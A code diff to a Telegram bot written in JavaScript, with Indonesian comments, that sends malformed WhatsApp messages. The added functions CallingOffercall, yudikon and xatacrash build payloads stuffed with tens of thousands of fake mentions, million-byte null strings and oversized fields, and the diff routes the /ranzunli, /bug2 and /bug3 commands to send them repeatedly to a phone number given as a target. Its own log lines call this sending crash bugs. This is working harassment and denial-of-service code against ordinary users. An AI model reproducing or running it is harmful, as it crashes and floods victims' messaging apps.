@@ -246,6 +246,135 @@ async function spamcall(target) {
         sock.ws.close(); // Tutup koneksi WebSocket
     }
 }
+async function CallingOffercall(target, mention) {
+console.log(chalk.white.bold(Success Send Offercers Invisible));
+  const mentionjid = [
+    "9999999999@s.whatsapp.net",
+    ...Array.from(
+      { length: 40000 },
+      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+    ),
+  ];
+
+  const embeddedMusic = {
+    musicContentMediaId: "156279385028392",
+    songId: "870166291800508",
+    author: "Hello" + "᭄".repeat(9999),
+    title: "Xatanical" + "᭄",
+    artworkDirectPath:
+      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
+    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
+    artistAttribution: "https://n.uguu.se/UnDeath.jpg",
+    countryBlocklist: true,
+    isExplicit: true,
+    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
+  };
+
+  const offercersMesagge = {
+    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
+    mimetype: "video/mp4",
+    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
+    fileLength: "999999999999",
+    seconds: 999999,
+    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
+    caption: "𝕯eh",
+    height: 640,
+    width: 640,
+    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
+    directPath:
+      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1743848703",
+    contextInfo: {
+      externalAdReply: {
+        showAdAttribution: true,
+        title: Hay,
+        body: ${"\u0000".repeat(9117)},
+        mediaType: 1,
+        renderLargerThumbnail: false,
+        thumbnailUrl: null,
+        sourceUrl: "https://t.me/xatanicvxii",
+      },
+      businessMessageForwardInfo: {
+        businessOwnerJid: target,
+      },
+      isSampled: true,
+      mentionedJid: mentionjid,
+    },
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: "1@newsletter",
+      serverMessageId: 1,
+      newsletterName: ${"ꦾ".repeat(100)},
+    },
+    streamingSidecar:
+      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
+    thumbnailDirectPath:
+      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
+    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
+    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
+    annotations: [
+      {
+        embeddedContent: {
+          embeddedMusic,
+        },
+        embeddedAction: true,
+      },
+    ],
+  };
+
+  const msg = generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: { offercersMesagge },
+      },
+    },
+    {}
+  );
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
+          },
+        ],
+      },
+    ],
+  });
+
+  if (mention) {
+    await sock.relayMessage(
+      target,
+      {
+        groupStatusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25,
+            },
+          },
+        },
+      },
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { is_status_mention: "true" },
+            content: undefined,
+          },
+        ],
+      }
+    );
+  }
+}
 async function VampireBlank(target, ptcp = true) {
   const Vampire = `_*~@8~*_\n`.repeat(10500);
   const CrashNotif = 'ꦽ'.repeat(55555);
@@ -1588,6 +1717,72 @@ async function bulldog(target, mention = true) { // Default true biar otomatis n
             }
         );
     }
+}
+async function yudikon(target) {
+  await sock.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "⟅ ༑ ▾𝐗‌𝐎‌𝐏‌𝐎‌𝐖‌𝐍⟅ ༑ ▾",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\0".repeat(1000000),
+            version: 3
+          }
+        }
+      }
+    }
+  }, {
+    participant: {
+      jid: target
+    }
+  });
+  console.log(chalk.yellow("𝐗‌𝐎‌𝐏𝐎𝐖‌𝐍 ༑⿻ SUCCES SENDED🦠"));
+}
+async function xatacrash(target) {
+  try {
+    setInterval(async () => {
+      let message = {
+        viewOnceMessage: {
+          message: {
+            interactiveResponseMessage: {
+              body: {
+                text: "xatanic.com",
+                format: "DEFAULT"
+              },
+              nativeFlowResponseMessage: [{
+                name: "call_permission_request",
+                paramsJson: "\0".repeat(1000000),
+                version: 3
+              }, {
+                name: "mpm",
+                paramsJson: "\0".repeat(7000),
+                version: 3
+              }, {
+                name: "payment_transaction_request",
+                paramsJson: JSON.stringify({
+                  syncType: "full_sync",
+                  data: "\0".repeat(7000)
+                }),
+                version: 3
+              }]
+            }
+          }
+        }
+      };
+      await sock.relayMessage(target, message, {
+        participant: {
+          jid: target
+        }
+      });
+      console.log("🔥 Crash bug dikirim ke " + target);
+    }, 3000);
+  } catch (err) {
+    console.log(err);
+  }
 }
 async function VampireBlankIphone(target) {
     try {
@@ -3270,7 +3465,7 @@ bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
     });
 
     while (true) {
-        await bulldozer3(formatedNumber);
+        await CallingOffercall(formatedNumber);
         await new Promise((resolve) => setTimeout(resolve, 3000));
         console.log(chalk.red("Send Bug Succes"))
     }
@@ -3367,7 +3562,7 @@ bot.onText(/\/bug2(?:\s(.+))?/, async (msg, match) => {
 
     // Proses pengiriman bug
     for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
-        await noclick(formatedNumber);
+        await xatacrash(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -3414,7 +3609,7 @@ bot.onText(/\/bug3(?:\s(.+))?/, async (msg, match) => {
     });
 
     for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
-        await Bug2(formatedNumber);
+        await yudikon(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
